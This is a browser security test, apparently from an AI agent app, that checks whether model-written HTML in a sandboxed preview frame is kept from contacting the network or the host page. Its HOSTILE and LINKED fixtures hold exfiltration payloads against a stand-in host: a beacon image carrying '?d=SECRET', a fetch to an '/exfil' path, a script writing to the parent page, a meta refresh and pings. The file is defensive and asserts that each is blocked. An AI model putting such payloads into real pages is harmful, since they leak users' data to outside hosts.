// frame-policy.mjs — real-browser verification that model-authored HTML shown
// by render_html cannot phone home, script, or touch the tile.
//
// This exists because the claim it checks is not self-evident and is easy to
// regress: the frame's sandbox (allow-downloads, its one token — D207) stops
// scripts, forms, popups and top navigation but does NOT stop subresource
// LOADS, and the xbin platform CSP on /c/ documents carries no
// img-src / connect-src at all. The only thing standing between a model's
// <img src="https://…/?leak=…"> and a real outbound request is the meta CSP
// that frameDoc() prepends. A unit test asserting "the string contains
// default-src 'none'" would prove nothing; this drives an actual Chromium and
// watches the network. It also holds the one way out on purpose (D207): a
// report's links to its own files — the ones its render step names — are
// downloads, and every other link stays inert.
//
//   node test/frame-policy.mjs          (needs playwright + a chromium build)
//
// Skips cleanly when playwright is unavailable, so it never blocks a machine
// that only builds the Go backend.
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const here = dirname(fileURLToPath(import.meta.url));

let chromium;
try {
  ({ chromium } = await import(process.env.PLAYWRIGHT_DIR
    ? join(process.env.PLAYWRIGHT_DIR, 'node_modules/playwright/index.mjs')
    : '/usr/local/node/lib/node_modules/playwright/index.mjs'));
} catch {
  try { ({ chromium } = await import('playwright')); } catch {
    console.log('SKIP: playwright not installed (npm i -g playwright && playwright install chromium)');
    process.exit(0);
  }
}

// frameDoc lives in agent.js, which imports from /vendor and so cannot be
// imported by node directly. Slice it out between two stable markers and fail
// loudly if either moves, rather than silently testing nothing.
const agentSrc = readFileSync(join(here, '..', 'agent.js'), 'utf8');
const start = agentSrc.indexOf('const FRAME_CSP');
const end = agentSrc.indexOf('let preview = null;');
if (start < 0 || end < 0 || end <= start) {
  console.error('FAIL: could not locate frameDoc() in agent.js — update the markers in this test');
  process.exit(1);
}
const frameDocSrc = agentSrc.slice(start, end);
// The frame as index.html declares it: its sandbox tokens are the policy.
const indexSrc = readFileSync(join(here, '..', 'index.html'), 'utf8');
const SANDBOX = (/<iframe id="prevframe"[^>]*\ssandbox="([^"]*)"/.exec(indexSrc) || [])[1];
// The native view's render preview (native/render-doc.js) must hold the same
// line: the same CSP, and the same results in the same browser — through
// DOMParser as the runtime document has it, and through the textual
// fallback (no DOMParser).
const nativeSrc = readFileSync(join(here, '..', 'native', 'render-doc.js'), 'utf8').replace(/^export /gm, '')
  .replace(/const FRAME_CSP/, 'const NATIVE_CSP').replace(/const FRAME_CSS/, 'const NATIVE_CSS')
  .replace(/\bFRAME_CSP\b(?!\s*=)/g, 'NATIVE_CSP').replace(/\bFRAME_CSS\b(?!\s*=)/g, 'NATIVE_CSS');

let failures = 0;
const ok = (name, cond, extra = '') => {
  console.log(`${cond ? 'PASS' : 'FAIL'}  ${name}${cond ? '' : '  ← ' + extra}`);
  if (!cond) failures++;
};

const browser = await chromium.launch();
const ctx = await browser.newContext();

// Anything reaching for the outside world is recorded, then aborted.
const escaped = [];
await ctx.route('**/*', (route) => {
  const u = route.request().url();
  if (u.includes('evil.example') || u.includes('beacon')) {
    escaped.push(u);
    return route.abort();
  }
  return route.continue();
});

const page = await ctx.newPage();
await page.goto('about:blank');
await page.addScriptTag({ content: frameDocSrc });
await page.addScriptTag({ content: nativeSrc });

ok('index.html: the preview frame\'s sandbox is allow-downloads alone', SANDBOX === 'allow-downloads', String(SANDBOX));
ok('index.html: never scripts, popups or the same origin', !/allow-(scripts|popups|same-origin|top-navigation|forms|modals)/.test(SANDBOX || 'x'));

// Every exfiltration channel that survives the sandbox on its own, plus the
// ordinary content a real report would contain.
const HOSTILE = `<!doctype html><html><head>
  <title>report</title>
  <meta http-equiv="refresh" content="0;url=https://evil.example/x">
  <link rel="stylesheet" href="https://evil.example/s.css">
  <style>h1{color:teal}</style>
</head><body>
  <h1>Q3 numbers</h1>
  <svg width="40" height="10"><rect width="40" height="10" fill="teal"/></svg>
  <img src="https://evil.example/beacon.png?d=SECRET">
  <a href="https://evil.example/y" target="_self">click me</a>
  <a href="#section">in-page</a>
  <script>window.parent.document.title = 'PWNED'; fetch('https://evil.example/exfil')</script>
  <iframe src="https://evil.example/nested"></iframe>
</body></html>`;

const res = await page.evaluate((h) => frameDoc(h), HOSTILE);
ok('the native preview has the same CSP', await page.evaluate(() => FRAME_CSP === NATIVE_CSP));
const nat = await page.evaluate((h) => renderDoc(h), HOSTILE);
ok('native (DOMParser): the same document as the web', nat.html === res.html && nat.blocked === res.blocked, nat.html.slice(0, 200));
const txt = await page.evaluate((h) => textual(h), HOSTILE);
ok('native (textual): our CSP is first', txt.html.startsWith('<!doctype html><html><head><meta http-equiv="Content-Security-Policy"'), txt.html.slice(0, 200));
ok('native (textual): meta refresh neutralised', !/http-equiv="refresh"/i.test(txt.html));
ok('native (textual): blocked resources counted', txt.blocked >= 3, `blocked=${txt.blocked}`);
ok('native (textual): off-page href stripped', !txt.html.includes('evil.example/y'));

// D208 (#46, #49): the app's preview keeps the hrefs the render step links
// as written (the app never follows one: canvas rev 2 hands the tap to the
// view, which shares the file) and strips the rest as frameDoc does — other
// off-page links, an image map's areas, SVG links, pings; an app before
// canvas rev 2 zooms by CSS.
const NLINKED = HOSTILE.replace('<a href="#section">', `<a href=" out/q3.pdf " ping="https://evil.example/ping">the figures</a>
  <map name="m"><area href="https://evil.example/area" shape="rect" coords="0,0,9,9"></map>
  <svg width="20" height="20"><a xlink:href="https://evil.example/svg"><rect width="20" height="20"/></a></svg>
  <a href="#section">`);
const linkOpts = { links: [{ href: 'out/q3.pdf', path: 'out/q3.pdf' }], zoom: 1.5 };
for (const [how, nl] of [
  ['DOMParser', await page.evaluate(([h, o]) => renderDoc(h, o), [NLINKED, linkOpts])],
  ['textual', await page.evaluate((h) => textual(h, 1.5, new Set(['out/q3.pdf'])), NLINKED)],
]) {
  ok(`native (${how}): a linked run file keeps its href, as written`, nl.html.includes('href=" out/q3.pdf "'), nl.html.slice(0, 300));
  ok(`native (${how}): every other off-page href is still stripped`, !nl.html.includes('evil.example/y'));
  ok(`native (${how}): an image map's area, an SVG link and a ping are stripped`,
    !/evil\.example\/(area|svg|ping)/.test(nl.html), nl.html.slice(nl.html.indexOf('the figures') - 120, nl.html.indexOf('the figures') + 400));
  ok(`native (${how}): the in-page anchor kept`, nl.html.includes('href="#section"'));
  ok(`native (${how}): an older app's zoom is CSS`, nl.html.includes('html{zoom:1.5}'));
  ok(`native (${how}): our CSP is still first`, /^<!doctype html><html><head><meta http-equiv="Content-Security-Policy"/i.test(nl.html));
}
const nlNone = await page.evaluate((h) => renderDoc(h).html, NLINKED);
ok('native: without the step\'s links nothing off-page is kept', !nlNone.includes('q3.pdf "') && !/<a[^>]*href="[^"#]/.test(nlNone) && !/<area[^>]*href=/.test(nlNone), nlNone.slice(0, 200));

// --- the produced document ----------------------------------------------
ok('meta refresh stripped', !/http-equiv="refresh"/i.test(res.html));
ok('off-page href stripped', !res.html.includes('evil.example/y'));
ok('target attribute stripped', !/target="_self"/i.test(res.html));
ok('in-page anchor kept', res.html.includes('href="#section"'));
ok('our CSP is first in head', /<head>\s*<meta http-equiv="Content-Security-Policy"/i.test(res.html),
   res.html.slice(0, 200));
ok('CSP denies everything by default', res.html.includes("default-src 'none'"));
ok('doctype emitted first', res.html.startsWith('<!doctype html>'));
ok('model content preserved', res.html.includes('Q3 numbers') && res.html.includes('<svg'));
ok('model inline style preserved', res.html.includes('color:teal'));
ok('blocked resources counted for the human', res.blocked >= 3, `blocked=${res.blocked}`);

// --- live behaviour in a frame configured exactly like index.html --------
const beforeTitle = await page.title();
await page.evaluate((s) => { window.__SANDBOX = s; }, SANDBOX);
for (const doc of [res.html, txt.html]) { // the web's, and the native fallback's
  await page.evaluate((html) => {
    const f = document.createElement('iframe');
    f.setAttribute('sandbox', window.__SANDBOX);
    f.setAttribute('referrerpolicy', 'no-referrer');
    f.style.cssText = 'width:600px;height:400px';
    f.srcdoc = html;              // PROPERTY assignment, as paintPreview does
    document.body.appendChild(f);
  }, doc);
}
await page.waitForTimeout(1500);

ok('no request escaped the frame', escaped.length === 0, JSON.stringify(escaped));
ok('parent DOM untouched by frame script', (await page.title()) === beforeTitle);

const frames = page.frames().filter((f) => f.parentFrame() === page.mainFrame());
ok('frames rendered', frames.length === 2);
for (const frame of frames) {
  const seen = await frame.evaluate(() => ({
    h1: document.querySelector('h1')?.textContent || '',
    origin: String(location.origin),
    imgWidths: [...document.images].map((i) => i.naturalWidth),
  }));
  ok('content is visible to the user', seen.h1 === 'Q3 numbers', JSON.stringify(seen));
  ok('frame is an opaque origin', seen.origin === 'null', seen.origin);
  ok('no image actually loaded', seen.imgWidths.every((w) => w === 0), JSON.stringify(seen.imgWidths));
}

// --- a report's links to its files (D207) ---------------------------------
// links: href → download URL, from the render step's links. Only those stay;
// each downloads in place (target _self, sandbox allow-downloads) — a click
// on one fetches the file as an attachment and the report stays shown.
const DL = 'https://xbin.test/api/~T/data/report%20data.csv';
const LINKED = `<!doctype html><html><body><h1>with files</h1>
  <a id="ok" href=" data.csv " target="_blank" ping="https://evil.example/ping">the data</a>
  <a id="other" href="other.csv">not linked by the step</a>
  <a id="web" href="https://evil.example/z">web</a>
  <map name="m"><area id="area" href="https://evil.example/area" shape="rect" coords="0,0,9,9"></map>
  <svg width="20" height="20"><a id="svga" xlink:href="https://evil.example/svg"><rect width="20" height="20"/></a></svg>
</body></html>`;
const lr = await page.evaluate(([h, u]) => frameDoc(h, new Map([['data.csv', u]])), [LINKED, DL]);
const lres = await page.evaluate((h) => {
  const d = new DOMParser().parseFromString(h, 'text/html');
  const at = (id) => { const e = d.getElementById(id); return Object.fromEntries([...e.attributes].map((a) => [a.name, a.value])); };
  return { ok: at('ok'), other: at('other'), web: at('web'), area: at('area'), svga: at('svga') };
}, lr.html);
ok('links: the step\'s link becomes its download', lres.ok.href === DL && lres.ok.download === '' && lres.ok.target === '_self', JSON.stringify(lres.ok));
ok('links: its ping is gone', !('ping' in lres.ok), JSON.stringify(lres.ok));
ok('links: a link the step doesn\'t name stays inert', !('href' in lres.other) && !('href' in lres.web), JSON.stringify([lres.other, lres.web]));
ok('links: an image map\'s area is stripped too', !('href' in lres.area), JSON.stringify(lres.area));
ok('links: an SVG link is stripped too', !('xlink:href' in lres.svga) && !('href' in lres.svga), JSON.stringify(lres.svga));
const unlinked = await page.evaluate((h) => frameDoc(h).html, LINKED);
ok('links: without the step\'s links nothing is kept', !unlinked.includes('xbin.test') && !/href="(data|other)\.csv/.test(unlinked));

const served = [];
await ctx.route('https://xbin.test/**', (route) => {
  served.push(route.request().url());
  return route.fulfill({ status: 200, contentType: 'text/csv', body: 'a,b\n1,2\n',
    headers: { 'Content-Disposition': 'attachment; filename="report data.csv"', 'X-Content-Type-Options': 'nosniff' } });
});
await page.evaluate((html) => {
  document.body.textContent = '';
  const f = document.createElement('iframe');
  f.setAttribute('sandbox', window.__SANDBOX);
  f.setAttribute('referrerpolicy', 'no-referrer');
  f.id = 'linked';
  window.__loads = 0;
  f.addEventListener('load', () => { window.__loads++; });
  f.srcdoc = html;
  document.body.appendChild(f);
}, lr.html);
await page.waitForFunction(() => window.__loads === 1);
const lf = page.frames().find((f) => f.parentFrame() === page.mainFrame());
const dl = page.waitForEvent('download', { timeout: 5000 }).catch(() => null);
await lf.click('#ok');
const got = await dl;
ok('links: a click downloads the file', !!got && got.suggestedFilename() === 'report data.csv', got ? got.suggestedFilename() : 'no download');
ok('links: …fetched from the step\'s URL', served.length === 1 && served[0] === DL, JSON.stringify(served));
await page.waitForTimeout(300);
ok('links: …and the report stays (a download loads nothing in the frame)', (await page.evaluate(() => window.__loads)) === 1
  && (await lf.evaluate(() => document.querySelector('h1')?.textContent)) === 'with files');
await lf.click('#other');
await lf.click('#web');
await page.waitForTimeout(500);
ok('links: inert links fetch nothing', served.length === 1 && !escaped.length, JSON.stringify([served, escaped]));

await browser.close();
console.log(failures ? `\n${failures} FAILURE(S)` : '\nall frame-policy checks passed');
process.exit(failures ? 1 : 0);
